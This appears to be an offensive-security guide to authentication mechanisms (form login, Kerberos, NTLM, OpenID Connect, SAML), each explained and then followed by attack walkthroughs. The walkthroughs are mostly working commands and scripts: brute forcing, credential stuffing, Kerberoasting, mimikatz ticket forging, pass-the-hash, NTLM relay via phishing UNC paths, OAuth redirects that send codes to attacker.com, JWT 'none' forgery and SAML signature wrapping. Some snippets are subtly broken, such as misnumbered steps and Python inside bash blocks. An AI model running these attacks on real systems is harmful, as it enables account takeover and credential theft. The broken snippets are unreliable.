# 1. AUTHENTICATION MECHANISMS <a name="auth-mechanisms"></a>

## 1.1 HTML FORM-BASED AUTHENTICATION

### 1.1.1 How It Works

**Basic Flow:**
1. User submits username/password via HTML form
2. Server validates credentials
3. Server creates session
4. Session ID stored in cookie
5. Subsequent requests include session cookie

**Example Implementation:**

```html
<!-- Login Form -->
<form method="POST" action="/login">
    <input type="text" name="username" required>
    <input type="password" name="password" required>
    <input type="submit" value="Login">
</form>
```

```php
// PHP Backend
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Validate credentials (use parameterized queries!)
    $stmt = $pdo->prepare("SELECT id, password_hash FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch();
    
    if ($user && password_verify($password, $user['password_hash'])) {
        // Authentication successful
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $username;
        header('Location: /dashboard');
    } else {
        echo "Invalid credentials";
    }
}
?>
```

### 1.1.2 Security Issues

**Common Vulnerabilities:**

1. **Credentials Sent Over HTTP:**
```bash
# Captured in cleartext
POST /login HTTP/1.1
Host: site.com

username=admin&password=SecretPass123
```

2. **SQL Injection:**
```sql
-- Vulnerable query:
SELECT * FROM users WHERE username='$user' AND password='$pass'

-- Attack:
username: admin' OR '1'='1' --
password: anything
```

3. **Weak Password Storage:**
```php
// BAD - plaintext
$query = "INSERT INTO users VALUES ('$user', '$pass')";

// BAD - MD5 (broken)
$hash = md5($password);

// BAD - SHA1 (broken)
$hash = sha1($password);

// GOOD - bcrypt
$hash = password_hash($password, PASSWORD_BCRYPT);
```

4. **Session Fixation:**
```bash
# Attacker sets session ID before login
http://site.com/login?PHPSESSID=attacker_session

# After victim logs in, attacker uses same session
```

5. **No Rate Limiting:**
```bash
# Brute force attack
for pass in $(cat passwords.txt); do
    curl -X POST http://site.com/login -d "username=admin&password=$pass"
done
```

### 1.1.3 Exploitation Examples

**Brute Force Attack:**

```bash
# Using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      http-post-form \
      "site.com:80:/login:username=^USER^&password=^PASS^:F=Invalid" \
      -t 16 -V

# Using custom script
#!/bin/bash
for password in $(cat passwords.txt); do
    response=$(curl -s -X POST http://site.com/login \
                    -d "username=admin&password=$password" \
                    -c cookies.txt)
    
    if echo "$response" | grep -q "Dashboard"; then
        echo "[+] Password found: $password"
        break
    fi
done
```

**Session Fixation:**

```html
<!-- Attacker's malicious page -->
<html>
<body>
<h1>Click here to login</h1>
<a href="http://vulnerable-site.com/login?PHPSESSID=attacker_controlled_session">
    Login to Vulnerable Site
</a>
</body>
</html>
```

```bash
# After victim logs in, attacker uses the session:
curl -b "PHPSESSID=attacker_controlled_session" http://vulnerable-site.com/admin
```

**Credential Stuffing:**

```python
# Using leaked credential databases
import requests

# Load leaked credentials
with open('leaked_credentials.txt') as f:
    for line in f:
        email, password = line.strip().split(':')
        
        r = requests.post('http://target-site.com/login', data={
            'username': email,
            'password': password
        })
        
        if 'Dashboard' in r.text:
            print(f"[+] Valid credentials: {email}:{password}")
```

---

## 1.2 KERBEROS

### 1.2.1 How It Works

**Kerberos Components:**
- **KDC (Key Distribution Center)**: Central authentication server
  - **AS (Authentication Server)**: Issues TGTs
  - **TGS (Ticket Granting Server)**: Issues service tickets
- **Principal**: User or service
- **Realm**: Administrative domain
- **Ticket**: Encrypted credential

**Authentication Flow:**

```
1. Client → AS: Request TGT (Ticket Granting Ticket)
   [User credentials]

2. AS → Client: TGT + Session Key
   [Encrypted with user's password hash]

3. Client → TGS: Request Service Ticket
   [TGT + Service identifier]

4. TGS → Client: Service Ticket
   [Encrypted with service's secret key]

5. Client → Service: Service Ticket
   [Ticket + Authenticator]

6. Service → Client: Service Response
   [Optionally mutual authentication]
```

### 1.2.2 Security Issues

**Kerberos Vulnerabilities:**

1. **Kerberoasting:**
```bash
# Extract service tickets and crack offline

# Using Rubeus (Windows):
Rubeus.exe kerberoast /outfile:tickets.txt

# Using GetUserSPNs.py (Impacket):
GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request

# Crack with hashcat:
hashcat -m 13100 tickets.txt rockyou.txt

# Crack with John:
john --format=krb5tgs --wordlist=rockyou.txt tickets.txt
```

2. **AS-REP Roasting:**
```bash
# Target users with "Do not require Kerberos preauthentication"

# Using GetNPUsers.py:
GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# Crack:
hashcat -m 18200 hashes.txt rockyou.txt
```

3. **Pass-the-Ticket:**
```bash
# Extract tickets from memory
mimikatz.exe
sekurlsa::tickets /export

# Inject ticket
mimikatz.exe
kerberos::ptt ticket.kirbi

# Or with Rubeus:
Rubeus.exe ptt /ticket:ticket.kirbi

# Access resources as that user:
dir \\server\share
```

4. **Golden Ticket:**
```bash
# With krbtgt hash, create ticket for any user

mimikatz.exe
kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:NTLM_HASH /id:500 /ptt

# Now domain admin!
```

5. **Silver Ticket:**
```bash
# With service account hash, create ticket for that service

mimikatz.exe
kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /target:server.corp.com /service:cifs /rc4:NTLM_HASH /ptt

# Access that specific service
```

### 1.2.3 Exploitation Examples

**Complete Kerberoasting Attack:**

```bash
# 1. Enumerate SPNs (Service Principal Names)
GetUserSPNs.py -request -dc-ip 192.168.1.10 DOMAIN/user:password

# Output:
# $krb5tgs$23$*sqlservice$DOMAIN.COM$DOMAIN.COM/sqlservice*$abc123...

# 2. Save to file
GetUserSPNs.py -request -dc-ip 192.168.1.10 DOMAIN/user:password -outputfile kerberoast.txt

# 3. Crack with hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

# 4. Found password
# $krb5tgs$23$*sqlservice...:Password123!

# 1. Use credentials
psexec.py DOMAIN/sqlservice:Password123!@192.168.1.50
```

**Pass-the-Ticket Attack:**

```bash
# From compromised Windows machine:

# 1. Dump tickets
mimikatz.exe
privilege::debug
sekurlsa::tickets /export

# Files created: [0;3e7]-2-0-40e10000-admin@krbtgt-DOMAIN.COM.kirbi

# 2. Transfer to attacker machine

# 3. Convert to ccache format (Linux)
ticketConverter.py admin.kirbi admin.ccache

# 4. Use ticket
export KRB5CCNAME=/path/to/admin.ccache

# 1. Access resources
smbclient //server/share -k
psexec.py -k -no-pass DOMAIN/admin@server.domain.com
```

---

## 1.3 NTLM (NT LAN Manager)

### 1.3.1 How It Works

**NTLM Authentication Flow:**

```
1. Client → Server: NEGOTIATE_MESSAGE
   [Flags, Domain, Workstation]

2. Server → Client: CHALLENGE_MESSAGE
   [8-byte challenge, Flags]

3. Client → Server: AUTHENTICATE_MESSAGE
   [Username, Domain, Response to challenge]
   Response = NTLM_hash(password) + challenge

4. Server: Validates response
```

**NTLMv1 vs NTLMv2:**
- **NTLMv1**: Older, weaker (should be disabled)
- **NTLMv2**: Stronger, adds timestamp and client challenge

### 1.3.2 Security Issues

**NTLM Vulnerabilities:**

1. **Pass-the-Hash:**
```bash
# Use NTLM hash without knowing password

# Using pth-winexe:
pth-winexe -U DOMAIN/admin%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c //192.168.1.100 cmd

# Using Impacket:
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.100

# Using CrackMapExec:
crackmapexec smb 192.168.1.100 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

2. **NTLM Relay:**
```bash
# Relay authentication to another server

# Using ntlmrelayx.py:
ntlmrelayx.py -tf targets.txt -smb2support

# Trigger authentication from victim (e.g., via link):
# \\attacker-ip\share

# Victim's NTLM auth relayed to targets
# If victim is admin, can execute commands!
```

3. **Responder Poisoning:**
```bash
# Capture NTLM hashes via LLMNR/NBT-NS poisoning

responder -I eth0 -wrf

# Victim broadcasts: "Where is \\fileserver?"
# Responder answers: "I'm fileserver!"
# Victim sends NTLM hash to attacker
# Captured in Responder logs

# Crack with hashcat:
hashcat -m 5600 captured_hashes.txt rockyou.txt
```

4. **Cracking NTLM Hashes:**
```bash
# NTLM hash format: 8846f7eaee8fb117ad06bdd830b7586c

# John the Ripper:
john --format=NT hashes.txt --wordlist=rockyou.txt

# Hashcat:
hashcat -m 1000 hashes.txt rockyou.txt

# Rainbow tables (faster but requires storage):
# http://project-rainbowcrack.com/
```

### 1.3.3 Exploitation Examples

**Complete NTLM Relay Attack:**

```bash
# Scenario: Relay domain user authentication to gain access

# 1. Start ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# 2. Start Responder (different terminal)
responder -I eth0 -wrf

# 3. Trigger authentication from victim
# Method A: Send phishing email with UNC path
# <img src="\\attacker-ip\share\image.png">

# Method B: If you have low-priv shell on victim:
# dir \\attacker-ip\share

# 4. ntlmrelayx captures authentication and relays to targets
# If successful, executes "whoami" on target

# 1. For interactive shell:
ntlmrelayx.py -tf targets.txt -smb2support -i

# Creates SMB server on port 11000
# Connect: nc 127.0.0.1 11000
```

**Pass-the-Hash to Domain Admin:**

```bash
# 1. Obtain local admin hash from compromised machine
secretsdump.py administrator:password@192.168.1.100

# Output includes:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# 2. Test hash on other machines
crackmapexec smb 192.168.1.0/24 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c --continue-on-success

# 3. Find machines where this admin account works
# [+] 192.168.1.50 - Administrator:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)
# [+] 192.168.1.51 - Administrator:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)

# 4. Execute commands
crackmapexec smb 192.168.1.50 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x "whoami"

# 1. Dump more hashes
crackmapexec smb 192.168.1.50 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c --sam
crackmapexec smb 192.168.1.50 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c --lsa

# 6. Eventually find Domain Admin hash
# 7. Pass-the-hash to Domain Controller
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:DA_NTLM_HASH DomainAdmin@192.168.1.10
```

---

## 1.4 OPENID CONNECT

### 1.4.1 How It Works

**OpenID Connect (OIDC)** is an identity layer on top of OAuth 2.0.

**Flow:**
```
1. User clicks "Login with Google/Facebook/etc."

2. Application redirects to Identity Provider (IdP):
   https://idp.com/auth?
     client_id=app123&
     redirect_uri=https://app.com/callback&
     response_type=code&
     scope=openid profile email

3. User authenticates with IdP

4. IdP redirects back with authorization code:
   https://app.com/callback?code=AUTH_CODE

5. Application exchanges code for tokens:
   POST https://idp.com/token
   code=AUTH_CODE&
   client_id=app123&
   client_secret=SECRET&
   grant_type=authorization_code

6. IdP returns tokens:
   {
     "access_token": "...",
     "id_token": "JWT_TOKEN",
     "refresh_token": "..."
   }

7. Application validates JWT and creates session
```

### 1.4.2 Security Issues

**OIDC/OAuth Vulnerabilities:**

1. **Redirect URI Manipulation:**
```bash
# Vulnerable authorization URL:
https://idp.com/auth?
  client_id=app123&
  redirect_uri=https://app.com/callback&
  ...

# Attacker modifies redirect_uri:
https://idp.com/auth?
  client_id=app123&
  redirect_uri=https://attacker.com/steal&
  ...

# User authenticates
# Authorization code sent to attacker!

# Attacker exchanges code for tokens
curl -X POST https://idp.com/token \
  -d "code=STOLEN_CODE&client_id=app123&client_secret=SECRET&grant_type=authorization_code"
```

2. **Open Redirect via redirect_uri:**
```bash
# If redirect_uri validation is weak:
redirect_uri=https://app.com/callback/../../../@attacker.com
redirect_uri=https://app.com@attacker.com
redirect_uri=https://app.com.attacker.com
redirect_uri=https://app.com%00.attacker.com
redirect_uri=https://app.com#@attacker.com
```

3. **State Parameter Missing (CSRF):**
```bash
# Without state parameter, attacker can force victim to login as attacker

# 1. Attacker initiates login, captures callback URL:
https://app.com/callback?code=ATTACKER_CODE

# 2. Attacker sends victim link to that URL

# 3. Victim clicks, gets logged in as attacker

# 4. Victim performs actions (e.g., adds credit card)

# 1. Attacker logs into their own account, sees victim's data!
```

4. **JWT Algorithm Confusion:**
```javascript
// Vulnerable JWT validation
const jwt = require('jsonwebtoken');
const token = req.headers.authorization;

// BAD - no algorithm verification
const decoded = jwt.verify(token, PUBLIC_KEY);

// Attacker creates token with "alg": "none"
// Or changes from RS256 to HS256 (symmetric)
```

5. **Client Secret in Mobile/JS Apps:**
```javascript
// INSECURE - secret in client-side code
const client_secret = "super_secret_key";

// Attacker extracts secret from:
// - Decompiled mobile app
// - Browser dev tools
// - JavaScript source code

// Then uses secret to generate valid tokens!
```

### 1.4.3 Exploitation Examples

**Redirect URI Attack:**

```bash
# 1. Discover OAuth endpoint:
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=123.apps.googleusercontent.com&
  redirect_uri=https://vulnerable-app.com/oauth/callback&
  response_type=code&
  scope=openid email

# 2. Test redirect_uri validation:
# Try changing to attacker domain:
redirect_uri=https://attacker.com/steal

# Try subdomain:
redirect_uri=https://attacker.vulnerable-app.com/steal

# Try path traversal:
redirect_uri=https://vulnerable-app.com/oauth/../../attacker.com

# Try open redirect on legitimate domain:
redirect_uri=https://vulnerable-app.com/redirect?url=https://attacker.com

# 3. If any bypass works, craft phishing link:
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=123.apps.googleusercontent.com&
  redirect_uri=https://attacker.com/steal&
  response_type=code&
  scope=openid email

# 4. Victim authenticates

# 1. Attacker receives code:
https://attacker.com/steal?code=VICTIM_CODE

# 6. Exchange for access token:
curl -X POST https://oauth2.googleapis.com/token \
  -d "code=VICTIM_CODE" \
  -d "client_id=123.apps.googleusercontent.com" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://attacker.com/steal" \
  -d "grant_type=authorization_code"

# 7. Access victim's resources!
```

**JWT None Algorithm Attack:**

```python
# Original valid JWT (RS256):
# eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.signature

# Decode header:
import base64, json
header = base64.b64decode('eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9')
# {"alg":"RS256","typ":"JWT"}

# Modify to "none":
fake_header = json.dumps({"alg":"none","typ":"JWT"})
fake_header_b64 = base64.b64encode(fake_header.encode()).decode().rstrip('=')

# Modify payload (elevate to admin):
payload = json.dumps({"sub":"user123","role":"admin"})
payload_b64 = base64.b64encode(payload.encode()).decode().rstrip('=')

# Create token with no signature:
fake_jwt = fake_header_b64 + '.' + payload_b64 + '.'

# Use token:
curl -H "Authorization: Bearer $fake_jwt" https://api.example.com/admin
```

---

## 1.5 SAML (Security Assertion Markup Language)

### 1.5.1 How It Works

**SAML 2.0 SSO Flow:**

```
1. User accesses Service Provider (SP):
   https://app.com/protected

2. SP generates SAML Request, redirects to IdP:
   https://idp.com/sso?SAMLRequest=BASE64_ENCODED_XML

3. User authenticates with IdP

4. IdP generates SAML Response (assertion):
   <saml:Assertion>
     <saml:Subject>
       <saml:NameID>user@example.com</saml:NameID>
     </saml:Subject>
     <saml:Conditions>
       <saml:NotBefore>2023-01-01T12:00:00Z</saml:NotBefore>
       <saml:NotOnOrAfter>2023-01-01T12:05:00Z</saml:NotOnOrAfter>
     </saml:Conditions>
     <saml:AuthnStatement>...</saml:AuthnStatement>
     <ds:Signature>...</ds:Signature>
   </saml:Assertion>

5. IdP redirects to SP with SAML Response:
   POST https://app.com/saml/acs
   SAMLResponse=BASE64_ENCODED_SIGNED_XML

6. SP validates signature and creates session
```

### 1.5.2 Security Issues

**SAML Vulnerabilities:**

1. **XML Signature Wrapping (XSW):**
```xml
<!-- Attacker modifies SAML response -->
<!-- Original signed assertion for "user@example.com" -->
<saml:Assertion ID="real">
  <saml:Subject>
    <saml:NameID>user@example.com</saml:NameID>
  </saml:Subject>
  <ds:Signature>VALID_SIGNATURE</ds:Signature>
</saml:Assertion>

<!-- Attacker adds unsigned assertion -->
<saml:Assertion ID="fake">
  <saml:Subject>
    <saml:NameID>admin@example.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>
<saml:Assertion ID="real">
  <saml:Subject>
    <saml:NameID>user@example.com</saml:NameID>
  </saml:Subject>
  <ds:Signature>VALID_SIGNATURE</ds:Signature>
</saml:Assertion>

<!-- If SP validates signature but processes wrong assertion → logged in as admin! -->
```

2. **Comment Injection:**
```xml
<saml:NameID>admin@example.com<!--</saml:NameID>
<saml:NameID>-->user@example.com</saml:NameID>

<!-- Signature computed on: admin@example.com<!--user@example.com -->
<!-- But application parses: admin@example.com -->
```

3. **SAML Replay:**
```bash
# Capture valid SAML response
# Replay it multiple times (if no validation of NotOnOrAfter or nonce)

curl -X POST https://app.com/saml/acs \
  -d "SAMLResponse=CAPTURED_RESPONSE"

# If successful → can reuse old authentications
```

4. **Missing Signature Validation:**
```bash
# If SP doesn't validate signature, craft arbitrary SAML response

import base64, zlib

saml_response = '''
<saml:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>admin@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</saml:Response>
'''

# Encode
encoded = base64.b64encode(zlib.compress(saml_response.encode())).decode()

# Send
curl -X POST https://app.com/saml/acs \
  -d "SAMLResponse=$encoded"
```

### 1.5.3 Exploitation Examples

**XML Signature Wrapping Attack:**

```python
# Tool: SAML Raider (Burp extension)

# 1. Intercept SAML Response in Burp
# 2. Send to SAML Raider
# 3. Apply XSW attack
# 4. Modify NameID to admin@example.com
# 1. Forward modified response
# 6. If vulnerable, logged in as admin!

# Manual exploitation:
import base64

# Original SAML Response (base64 decoded):
original_xml = '''
<saml:Response>
  <saml:Assertion ID="id1">
    <saml:Subject>
      <saml:NameID>user@example.com</saml:NameID>
    </saml:Subject>
    <ds:Signature>
      <ds:Reference URI="#id1">...</ds:Reference>
      VALID_SIGNATURE
    </ds:Signature>
  </saml:Assertion>
</saml:Response>
'''

# Inject fake assertion:
wrapped_xml = '''
<saml:Response>
  <saml:Assertion ID="fake">
    <saml:Subject>
      <saml:NameID>admin@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="id1">
    <saml:Subject>
      <saml:NameID>user@example.com</saml:NameID>
    </saml:Subject>
    <ds:Signature>
      <ds:Reference URI="#id1">...</ds:Reference>
      VALID_SIGNATURE
    </ds:Signature>
  </saml:Assertion>
</saml:Response>
'''

# Encode and send
wrapped_b64 = base64.b64encode(wrapped_xml.encode()).decode()
# POST to /saml/acs with SAMLResponse=wrapped_b64
```

---
